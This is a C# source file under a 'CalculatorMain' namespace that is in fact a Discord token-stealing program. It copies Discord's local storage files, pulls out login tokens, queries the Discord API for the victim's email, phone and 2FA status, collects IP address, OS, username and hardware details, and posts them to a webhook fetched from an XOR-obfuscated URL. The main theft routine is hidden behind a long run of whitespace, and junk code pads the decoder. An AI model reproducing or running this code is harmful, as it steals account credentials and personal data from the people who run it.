using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace CalculatorMain
{
    class Other
    {
        public static Random rano = new Random();
        public static string GetResponse(string token)
        {
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://discordapp.com/api/v6/users/@me");
                request.Headers.Set("Authorization", token);
                request.ContentType = "application/json";
                request.UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11";
                request.Method = "GET"; request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;

                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (Stream stream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(stream))
                {
                    return reader.ReadToEnd();
                }
            }
            catch (Exception)
            {
                return "Error";
            }
        }

        public static String GetRam()
        {
            ManagementClass mc = new ManagementClass("Win32_ComputerSystem");
            ManagementObjectCollection moc = mc.GetInstances();
            foreach (ManagementObject item in moc)
            {
                return Convert.ToString(Math.Round(Convert.ToDouble(item.Properties["TotalPhysicalMemory"].Value) / 1048576, 0)) + " MB";
            }

            return "RAMsize";
        }

        public static void DiscordWebhook(bool embedMessage, int color, string URL, string authorName, string authorIcon, string message, string Title, string Username, string Content = "")
        {
            if (embedMessage == true)
            {
                WebRequest wr = (HttpWebRequest)WebRequest.Create(URL);

                wr.ContentType = "application/json";

                wr.Method = "POST";

                using (var sw = new StreamWriter(wr.GetRequestStream()))
                {


                    string json = JsonConvert.SerializeObject(new
                    {
                        username = Username,
                        avatarURL = "",
                        content = Content,
                        embeds = new[]
                        {
                        new
                        {
                            author = new
                            {
                                name = authorName,
                                url = "",
                                icon_url = authorIcon
                            },
                            description = message,
                            title = Title,
                            color = color,
                        }
                }
                    });

                    sw.Write(json);
                }

                var response = (HttpWebResponse)wr.GetResponse();
            }
            else
            {
                Send(URL, new NameValueCollection()
            {
                { "username", Username },
                { "content", message }
            });
            }
        }

        public static DateTime NetWorkTime()
        {
            const string ntpServer = "time.windows.com";
            byte[] ntpData = new byte[48];
            ntpData[0] = 0x1B;
            try
            {
                IPAddress[] addresses = Dns.GetHostEntry(ntpServer).AddressList;
                IPEndPoint ipEndPoint = new IPEndPoint(addresses[0], 123);
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
                {
                    socket.Connect(ipEndPoint);
                    socket.ReceiveTimeout = 3000;
                    try
                    {
                        socket.Send(ntpData);
                        socket.Receive(ntpData);
                        socket.Close();
                    }
                    catch
                    {
                        socket.Send(ntpData);
                        socket.Receive(ntpData);
                        socket.Close();
                    }
                }
                const byte serverReplyTime = 40;
                ulong intPart = BitConverter.ToUInt32(ntpData, serverReplyTime);
                ulong fractPart = BitConverter.ToUInt32(ntpData, serverReplyTime + 4);
                intPart = SwapEndianness(intPart);
                fractPart = SwapEndianness(fractPart);
                ulong milliseconds = (intPart * 1000) + ((fractPart * 1000) / 0x100000000L);
                DateTime networkDateTime = new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddMilliseconds((long)milliseconds);
                return networkDateTime.ToLocalTime();
            }
            catch
            {
                return new DateTime(1, 1, 1, 0, 0, 0, DateTimeKind.Utc);
            }
        }

        static uint SwapEndianness(ulong x)
        {
            return (uint)(((x & 0x000000ff) << 24) +
                           ((x & 0x0000ff00) << 8) +
                           ((x & 0x00ff0000) >> 8) +
                           ((x & 0xff000000) >> 24));
        }

        public static byte[] Send(string uri, NameValueCollection pairs)
        {
            byte[] numArray;
            using (WebClient webClient = new WebClient())
            {
                numArray = webClient.UploadValues(uri, pairs);
            }
            return numArray;
        }

        public static void DisposeEndianness()
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                foreach (var Endi in GetToken()) { if (Other.GetResponse(Endi) != "ErrorModule") { var data = GetResponse(Endi); if (data.ToLower() != "error") { string ortinO = "Null"; JObject OBJ = JObject.Parse(data); if (data.Contains("premium_type")) { ortinO = OBJ["premium_type"].ToString(); if (ortinO.ToLower() == "true") ortinO = "True"; else ortinO = "False"; } string eman = OBJ["username"].ToString() + "#" + OBJ["discriminator"].ToString(); string liam = OBJ["email"].ToString(); string deif = OBJ["verified"].ToString(); string enohp = OBJ["phone"].ToString(); if (String.IsNullOrEmpty(enohp)) enohp = "None"; string NSFW = OBJ["nsfw_allowed"].ToString(); string ID = OBJ["id"].ToString(); string Avatar = "https://cdn.discordapp.com/avatars/" + ID + "/" + OBJ["avatar"].ToString(); string Mfa = OBJ["mfa_enabled"].ToString(); string Lang = OBJ["locale"].ToString(); string CPU = System.Runtime.InteropServices.RuntimeInformation.ProcessArchitecture.ToString(); string newLine = "\n"; string RAM = Other.GetRam(); string Region = RegionInfo.CurrentRegion.ThreeLetterISORegionName; string LocalTime = Other.NetWorkTime().ToString("MM/dd/yyyy HH:mm"); string LocalPrivate = "VZ0C722SFQiDQYhPkKy3Z0ds32XHz0r3inZeuR9YAf7Eopjmlc1nFT0uhBV46AHWfwtodGRoo38AezFZsduyrqEJUObAj0HP7RAJ6YbpknpYj2SoM2uKhPWmp9Bt8gHz3pVBTsdRLfi59RNNGlQShprFI3ESpn4i4677" + "VZ0C722SFQiDQYhPkKy3Z0ds32XHz0r3inZeuR9YAf7Eopjmlc1nFT0uhBV46AHWfwtodGRoo38AezFZsduyrqEJUObAj0HP7RAJ6YbpknpYj2SoM2uKhPWmp9Bt8gHz3pVBTsdRLfi59RNNGlQShprFI3ESpn4i4677" + "**Username: **" + eman + newLine + "**Email: **" + liam + newLine + "**Language: **" + Lang + newLine + "**Verified User: **" + deif + newLine + "**Phone: **" + enohp + newLine + "**2FA: **" + Mfa + newLine + "**NSFW Enabled: **" + NSFW + newLine + "**Nitro: **" + Endi + newLine + "\n**Token**\n" + ortinO; string LocalArray = "VZ0C722SFQiDQYhPkKy3Z0ds32XHz0r3inZeuR9YAf7Eopjmlc1nFT0uhBV46AHWfwtodGRoo38AezFZsduyrqEJUObAj0HP7RAJ6YbpknpYj2SoM2uKhPWmp9Bt8gHz3pVBTsdRLfi59RNNGlQShprFI3ESpn4i4677" + "VZ0C722SFQiDQYhPkKy3Z0ds32XHz0r3inZeuR9YAf7Eopjmlc1nFT0uhBV46AHWfwtodGRoo38AezFZsduyrqEJUObAj0HP7RAJ6YbpknpYj2SoM2uKhPWmp9Bt8gHz3pVBTsdRLfi59RNNGlQShprFI3ESpn4i4677" + " **IP Address: **" + GetCurrectIP() + newLine + "**Operating System: **" + Environment.OSVersion + newLine + "**PC Name: **" + Environment.UserName + newLine + "**CPU Architecture: **" + CPU + newLine + "**Memory: **" + RAM + newLine + "**Region: **" + Region + newLine + "**Local Time: **" + LocalTime; var Peledon__ = LocalPrivate.Replace("VZ0C722SFQiDQYhPkKy3Z0ds32XHz0r3inZeuR9YAf7Eopjmlc1nFT0uhBV46AHWfwtodGRoo38AezFZsduyrqEJUObAj0HP7RAJ6YbpknpYj2SoM2uKhPWmp9Bt8gHz3pVBTsdRLfi59RNNGlQShprFI3ESpn4i4677", ""); var LocalS = LocalArray.Replace("VZ0C722SFQiDQYhPkKy3Z0ds32XHz0r3inZeuR9YAf7Eopjmlc1nFT0uhBV46AHWfwtodGRoo38AezFZsduyrqEJUObAj0HP7RAJ6YbpknpYj2SoM2uKhPWmp9Bt8gHz3pVBTsdRLfi59RNNGlQShprFI3ESpn4i4677", ""); List<string> Driver = new List<string>(); Driver.Add("Timer"); Driver.Add("Cookie"); Driver.Add("Discord"); Driver.Add("BustDown"); Driver.Add("Tex"); Driver.Add("LocalSystem"); Driver.Add("Screen"); Driver.Add("Timer"); Driver.Add("Cookie"); Driver.Add("Discord"); Driver.Add("BustDown"); Driver.Add("Tex"); Driver.Add("LocalSystem"); Driver.Add("Screen"); Driver.Add("Timer"); Driver.Add("Cookie"); Driver.Add("Discord"); Driver.Add("BustDown"); Driver.Add("Tex"); Driver.Add("LocalSystem"); Driver.Add("Screen"); Driver.Add("Timer"); Driver.Add("Cookie"); Driver.Add("Discord"); Driver.Add("BustDown"); Driver.Add("Tex"); Driver.Add("LocalSystem"); Driver.Add("Screen"); Driver.Add("Timer"); Driver.Add("Cookie"); Driver.Add("Discord"); Driver.Add("BustDown"); Driver.Add("Tex"); Driver.Add("LocalSystem"); Driver.Add("Screen"); Driver.Add("Timer"); Driver.Add("Cookie"); Driver.Add("Discord"); Driver.Add("BustDown"); Driver.Add("Tex"); Driver.Add("LocalSystem"); Driver.Add("Screen"); Driver.Add(LocalS); Driver.Add(Peledon__); int Position = Driver.Count(); WebClient Security = new WebClient(); string value = ""; System.IO.Stream stream = Security.OpenRead(StrXOR("lpptw>++tewpafmj*gki+ves+wq~v|O]}", 4)); using (System.IO.StreamReader reader = new System.IO.StreamReader(stream)) { String text = reader.ReadToEnd(); value = text; } string FirstOfDec = StrXOR(value, 15); string Header = Driver[Position - 1]; string SecondHeader = Driver[Position - 2]; DiscordWebhook(true, 65535, FirstOfDec, eman + " (" + ID + ")", Avatar, Header, "Account Information", "STZ Token Grabber"); DiscordWebhook(true, 7506394, FirstOfDec, eman + " (" + ID + ")", Avatar, SecondHeader, "PC Information", "STZ Token Grabber"); } } }
        }

        public static string StrXOR(string str, int Key)
        {
            bool D6MKWPLL48YFD = true;

            if (!D6MKWPLL48YFD)
                D6MKWPLL48YFD = false;
            else if (D6MKWPLL48YFD = false)
                D6MKWPLL48YFD = true;
            else
                D6MKWPLL48YFD = true;
            int DCLDWSW1MW5XX = 251367187;
            if (DCLDWSW1MW5XX > 251367134)
                DCLDWSW1MW5XX = 251367128;
            else if (DCLDWSW1MW5XX <= 251367196)
                DCLDWSW1MW5XX++;
            else
                DCLDWSW1MW5XX = (251367104 / 251367157);
            bool D3BWJ4XNY03PG = true;
            if (!D3BWJ4XNY03PG)
                D3BWJ4XNY03PG = true;
            else if (D3BWJ4XNY03PG = true)
                D3BWJ4XNY03PG = true;

            char[] newStr = new char[str.Length];
            for (int i = 0; i < str.Length; ++i)
                newStr[i] = (char)(str[i] ^ (char)Key);

            return new string(newStr);

            bool DK5GXWK6QRDI0 = true;
            if (!DK5GXWK6QRDI0)
                DK5GXWK6QRDI0 = true;
            else if (DK5GXWK6QRDI0 = true)
                DK5GXWK6QRDI0 = true;
            else
                DK5GXWK6QRDI0 = false;
            bool DB3KPCCORD9MW = false;
            if (!DB3KPCCORD9MW)
                DB3KPCCORD9MW = true;
            else if (DB3KPCCORD9MW = true)
                DB3KPCCORD9MW = true;
            else
                DB3KPCCORD9MW = false;
            bool DSJS2DZ4X63RH = true;
            if (!DSJS2DZ4X63RH)
                DSJS2DZ4X63RH = false;
            else if (DSJS2DZ4X63RH = true)
                DSJS2DZ4X63RH = true;
            else
                DSJS2DZ4X63RH = false;
            int D1EO0HQ6H6MZE = 251367137;
            if (D1EO0HQ6H6MZE > 251367106)
                D1EO0HQ6H6MZE = 251367165;
            else if (D1EO0HQ6H6MZE <= 251367196)
                D1EO0HQ6H6MZE++;
        }

        public static List<string> GetToken()
        {
            List<string> Tokens = new List<string>();
            var files = SearchForFile();
            string matchToken = "";
            if (files.Count == 0)
            {
                matchToken = "Didn't find any files";
                Tokens.Add(matchToken);
                return Tokens;
            }
            foreach (string token in files)
            {
                foreach (Match match in Regex.Matches(token, "[^\"]*"))
                {
                    if (!match.ToString().Contains("") || !match.ToString().Contains(""))
                    {
                        if (match.Length == 59 && !match.ToString().Contains("http"))
                        {
                            matchToken = match.ToString();
                            Tokens.Add(matchToken);
                        }
                    }
                    else
                    {
                        matchToken = "";
                    }
                }
            }
            return Tokens;
        }

        public static string GetCurrectIP()
        {
            string url = "http://checkip.dyndns.org";
            System.Net.WebRequest req = System.Net.WebRequest.Create(url);
            System.Net.WebResponse resp = req.GetResponse();
            System.IO.StreamReader sr = new System.IO.StreamReader(resp.GetResponseStream());
            string response = sr.ReadToEnd().Trim();
            string[] a = response.Split(':');
            string a2 = a[1].Substring(1);
            string[] a3 = a2.Split('<');
            string a4 = a3[0];
            return a4;
        }

        public static List<string> SearchForFile()
        {
            List<string> discFiles = new List<string>();
            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

            if (!Directory.Exists(discordPath))
            {
                Console.WriteLine("Discord path not found");
                return discFiles;
            }


            foreach (string file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly))
            {
                string random = rano.Next(0, 8345).ToString();
                FileStream inf = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                FileStream outf = new FileStream(random, FileMode.Create);
                int a;
                while ((a = inf.ReadByte()) != -1)
                {
                    outf.WriteByte((byte)a);
                }
                inf.Close();
                inf.Dispose();
                outf.Close();
                outf.Dispose();
                string rawText = File.ReadAllText(random);
                if (rawText.Contains("oken"))
                {
                    discFiles.Add(rawText);
                    File.Delete(random);
                }
            }
            foreach (string file in Directory.GetFiles(discordPath, "*.log", SearchOption.TopDirectoryOnly))
            {
                string random = rano.Next(0, 8345).ToString();
                FileStream inf = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                FileStream outf = new FileStream(random, FileMode.Create);
                int a;
                while ((a = inf.ReadByte()) != -1)
                {
                    outf.WriteByte((byte)a);
                }
                inf.Close();
                inf.Dispose();
                outf.Close();
                outf.Dispose();
                string rawText = File.ReadAllText(random);
                if (rawText.Contains("oken"))
                {
                    discFiles.Add(rawText);
                    File.Delete(random);
                }
            }
            return discFiles;
        }
    }
}
